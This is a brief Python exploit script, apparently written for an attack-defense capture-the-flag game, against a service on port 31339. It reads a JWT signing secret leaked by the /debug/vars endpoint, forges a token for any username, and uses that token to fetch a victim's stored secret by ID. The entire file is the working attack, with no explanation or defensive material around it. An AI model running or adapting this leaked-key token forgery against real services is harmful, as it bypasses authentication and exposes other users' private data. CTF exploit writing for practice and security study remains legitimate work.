#!/usr/bin/env python3

import re
import sys

import jwt
from checklib import *

s = get_initialized_session()

ip = sys.argv[1]
username, secret_id = sys.argv[2].split(':')
port = 31339

url = f"http://{ip}:{port}"

r = s.get(f"{url}/debug/vars")

secret_key = re.findall(r'secret-key=([^"]+)"', r.text)[0]

print('leaked secret key:', secret_key)

token = jwt.encode({'username': username}, secret_key, algorithm='HS256')

print('token:', token)

s.headers['Authentication'] = token

r = s.get(f"{url}/get", params={'id': secret_id})

print(r.text)
